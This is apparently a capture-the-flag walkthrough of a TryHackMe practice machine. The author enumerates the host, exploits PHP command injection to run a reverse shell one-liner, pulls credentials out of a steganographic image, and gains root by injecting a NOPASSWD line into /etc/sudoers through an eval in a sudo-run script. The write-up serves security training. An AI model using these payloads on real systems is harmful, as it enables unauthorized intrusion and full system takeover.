Enumeration:

```
┌──(kali㉿kali)-[~/Desktop/THM/U.A.HighSchool]
└─$ sudo nmap -sS 10.10.228.138 > nmap_results.txt 

┌──(kali㉿kali)-[~/Desktop/THM/U.A.HighSchool]
└─$ cat nmap_results.txt
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-26 15:24 IST
Nmap scan report for 10.10.228.138
Host is up (0.26s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 3.17 seconds
```
```             
┌──(kali㉿kali)-[~/Desktop/THM/U.A.HighSchool]
└─$ sudo nmap -sS -sV -sC -O -Pn -p22,80 10.10.228.138 > nmap_versions.txt

┌──(kali㉿kali)-[~/Desktop/THM/U.A.HighSchool]
└─$ cat nmap_versions.txt 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-26 15:25 IST
Nmap scan report for 10.10.228.138
Host is up (0.22s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 58:2f:ec:23:ba:a9:fe:81:8a:8e:2d:d8:91:21:d2:76 (RSA)
|   256 9d:f2:63:fd:7c:f3:24:62:47:8a:fb:08:b2:29:e2:b4 (ECDSA)
|_  256 62:d8:f8:c9:60:0f:70:1f:6e:11:ab:a0:33:79:b5:5d (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: U.A. High School
|_http-server-header: Apache/2.4.41 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (93%), Linux 2.6.39 - 3.2 (93%), Linux 3.1 - 3.2 (93%), Linux 3.2 - 4.9 (93%), Linux 3.7 - 3.10 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 5 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.36 seconds
```

As usual, SSH is useless without a username and password. Website running on port 80

Sub-directories fuzzing with dirsearch.
```
┌──(kali㉿kali)-[~/Desktop/THM/U.A.HighSchool]
└─$ dirsearch -u http://10.10.228.138 -w /usr/share/seclists/Discovery/Web-Content/big.txt 
...
Target: http://10.10.228.138/

[15:20:01] Starting: 
[15:20:36] 301 -  315B  - /assets  ->  http://10.10.228.138/assets/         
[15:23:38] 403 -  278B  - /server-status                                      
                                                                             
Task Completed
```
```                                     
┌──(kali㉿kali)-[~/Desktop/THM/U.A.HighSchool]
└─$ dirsearch -u http://10.10.228.138/assets/ -w /usr/share/seclists/Discovery/Web-Content/big.txt 

...
Target: http://10.10.228.138/

[15:38:02] Starting: assets/
[15:38:09] 301 -  322B  - /assets/images  ->  http://10.10.228.138/assets/images/
...
```
<img src=https://github.com/user-attachments/assets/1b52da5d-99dc-4092-a785-961a1456f6b2>


The image subdirectory is not accessible. So, with the knowledge from the previous labs, I tried index.php. And it didn't show any error.

<img src=https://github.com/user-attachments/assets/f23b887b-08a1-4772-b92d-ea58e8c12321>

Next, I PHP URL injection.

<img src=https://github.com/user-attachments/assets/9519f37e-ea7a-4d6a-9d19-c0c0afd643f0>

```
┌──(kali㉿kali)-[~/Desktop/THM/U.A.HighSchool]
└─$ echo "aW1hZ2VzCmluZGV4LnBocApzdHlsZXMuY3NzCg==" | base64 -d                                               
images
index.php
styles.css
```

This means I can inject commands in the URL and so I injected a one-liner reverse PHP command

`php -r '$sock=fsockopen("10.0.0.1",4242);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'`

And I opened a netcat listener on my machine:
```
┌──(kali㉿kali)-[~/Desktop/THM/U.A.HighSchool]
└─$ nc -nlvp 4444                           
listening on [any] 4444 ...
connect to [10.17.94.32] from (UNKNOWN) [10.10.228.138] 53848
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ 
```

Then I tried to search for directories /var/backups, /home and at last the /opt directory.

```
$ cd /opt
$ ls
NewComponent
$ cd NewComponent 
$ ls
feedback.sh
$ ls -l 
total 4
-r-xr-xr-x 1 deku deku 684 Jan 23  2024 feedback.sh
```

I thought that I could use this file to gain shell as deku. But it didn't work. I tried some things but it didn't work.

Then, I again started looking for directories.

```
$ pwd
/var/www
$ ls
Hidden_Content
html
$ cd Hidden_Content
$ ls 
passphrase.txt
$ cat passphrase.txt
QWxsbWlnaHRGb3JFdmVyISEhCg==
```

```
┌──(kali㉿kali)-[~/Desktop/THM/U.A.HighSchool]
└─$ echo "QWxsbWlnaHRGb3JFdmVyISEhCg==" | base64 -d
AllmightForEver!!!
```

I have seen passphrases in stenography mostly when I practice CTFs on PicoCTF. It then reminded me of the 'image' folder under assets. I navigated to the folder.

```
$ pwd
/var/www/html/assets/images
$ ls
oneforall.jpg
yuei.jpg
```

Copied the image files to my machine using 'wget' and then tried 'steghide' with the two. The yuei.jpg file is a normal image file. 

```
┌──(kali㉿kali)-[~/Desktop/THM/U.A.HighSchool]
└─$ steghide extract -sf oneforall.jpg
Enter passphrase: 
steghide: the file format of the file "oneforall.jpg" is not supported.
```

The oneforall.jpg was corrupted. I can't see what the image is upon opening the file. So, I used 'hexeditor' to look at the file.

<img src=https://github.com/user-attachments/assets/2b958394-f8c6-4bd1-8fd2-61ef2251cad9>

The extension for the file is JPG, but it can be seen that the signature is PNG here. I changed it to the corresponding JPG signature `FF D8 FF E0 00 10 4A 46 49 46 00 01`, (Wikipedia), and I
tried the extraction with steghide again.
```
┌──(kali㉿kali)-[~/Desktop/THM/U.A.HighSchool]
└─$ steghide extract -sf oneforall.jpg
Enter passphrase: 
wrote extracted data to "creds.txt".
```

The creds.txt file contains the credentials for deku

Changing to this user.

```
┌──(kali㉿kali)-[~/Desktop/THM/U.A.HighSchool]
└─$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.17.94.32] from (UNKNOWN) [10.10.228.138] 43866
/bin/sh: 0: can't access tty; job control turned off
$ cd /home; ls
deku
$ su deku
Password: One?For?All_!!one1/A                    
whoami
deku
```

I waited for 2 minutes, thinking it was taking time to get the shell. But I have got the shell. In some of the videos related to CyberSecurity on YouTube, I heard of reusing credentials.

Generally, the SSH credentials are not the same as the user's password, but I tried to SSH into deku with the same password, and it worked.

```
┌──(kali㉿kali)-[~/Desktop/THM/U.A.HighSchool]
└─$ ssh deku@10.10.228.138            
deku@10.10.228.138's password: 
...
Last login: Thu Feb 22 21:27:54 2024 from 10.0.0.3
deku@myheroacademia:~$
```

This is better as the Netcat listener can be lost with some connection issues. So I closed it.

Then finding ways for privilege escalation
```
deku@myheroacademia:~$ sudo -l
[sudo] password for deku: 
Matching Defaults entries for deku on myheroacademia:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User deku may run the following commands on myheroacademia:
    (ALL) /opt/NewComponent/feedback.sh
deku@myheroacademia:~$
```

This file will be helpful here.

```
deku@myheroacademia:/opt/NewComponent$ ls -l
total 4
-r-xr-xr-x 1 deku deku 684 Jan 23  2024 feedback.sh
deku@myheroacademia:/opt/NewComponent$ chmod +w feedback.sh 
chmod: changing permissions of 'feedback.sh': Operation not permitted
deku@myheroacademia:/opt/NewComponent$ cd ..
deku@myheroacademia:/opt$ ls -l
total 4
dr-xr-xr-x 2 root root 4096 Jan 23  2024 NewComponent
deku@myheroacademia:/opt$
```

I thought of changing the content of the files so that when run with 'sudo', I will get the shell. But I don't have permission to change the permissions of the file as the folder owner is root.

```
deku@myheroacademia:/opt/NewComponent$ cat feedback.sh 
...

if [[ "$feedback" != *"\`"* && "$feedback" != *")"* && "$feedback" != *"\$("* && "$feedback" != *"|"* && "$feedback" != *"&"* && "$feedback" != *";"* && "$feedback" != *"?"* && "$feedback" != *"!"* && "$feedback" != *"\\"* ]]; then
...
```

The file is a normal file; when run, it will take in input from the user, store it in a variable called feedback, and then check the content with the above statement.

From doing SQLi, I gave `"` as the input and got this:
```
deku@myheroacademia:/opt/NewComponent$ sudo ./feedback.sh 
Hello, Welcome to the Report Form       
This is a way to report various problems
    Developed by                        
        The Technical Department of U.A.
Enter your feedback:
"
It is This:
/opt/NewComponent/feedback.sh: eval: line 14: unexpected EOF while looking for matching `"'
/opt/NewComponent/feedback.sh: eval: line 15: syntax error: unexpected end of file
Feedback successfully saved.
```

There is a `eval` command at line 14. The command work as follows:

```
The 'eval' command that evaluates the variable
┌──(kali㉿kali)-[~/Desktop/THM/U.A.HighSchool]
└─$ var="ls -l"                                                                                                                              
┌──(kali㉿kali)-[~/Desktop/THM/U.A.HighSchool]
└─$ eval "$var"                                                
total 344
-rw-rw-r-- 1 kali kali    150 Aug 26 16:18 creds.txt
-rw-rw-r-- 1 kali kali    287 Aug 26 15:24 nmap_results.txt
-rw-rw-r-- 1 kali kali   1264 Aug 26 15:25 nmap_versions.txt
-rw-rw-r-- 1 kali kali  98264 Aug 26 16:16 oneforall.jpg
drwxrwxr-x 3 kali kali   4096 Aug 26 15:20 reports
-rw-rw-r-- 1 kali kali 237170 Jul  9  2023 yuei.jpg
```

So this has to be manipulated so that I can get root access. I thought of adding deku into the `/etc/sudoers` files after which I can get the root access easily by running `sudo bash`.

From StackOverflow:
```
To give the user "foo" unlimited passwordless access to root privileges via the sudo command, edit /etc/sudoers and add the line:

foo   ALL = NOPASSWD: ALL
```

I initially gave the input as `<user> ALL=(ALL:ALL) ALL`, but as it contains parenthesis, it is being rejected. Then I used the above one.

```
deku@myheroacademia:/opt/NewComponent$ sudo ./feedback.sh
Hello, Welcome to the Report Form       
This is a way to report various problems
    Developed by                        
        The Technical Department of U.A.
Enter your feedback:
deku ALL = NOPASSWD: ALL >> /etc/sudoers
It is This:
Feedback successfully saved.
deku@myheroacademia:/opt/NewComponent$ sudo -l
Matching Defaults entries for deku on myheroacademia:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User deku may run the following commands on myheroacademia:
    (ALL) /opt/NewComponent/feedback.sh
    (root) NOPASSWD: ALL
```

**The key point to note here is to run the feedback.sh file with sudo, as making changes to the sudoers file requires root permissions.**

```
deku@myheroacademia:/opt/NewComponent$ sudo bash
root@myheroacademia:/opt/NewComponent# whoami
root
root@myheroacademia:/opt/NewComponent# id
uid=0(root) gid=0(root) groups=0(root)
root@myheroacademia:/opt/NewComponent# 
```

And here we get the root shell.
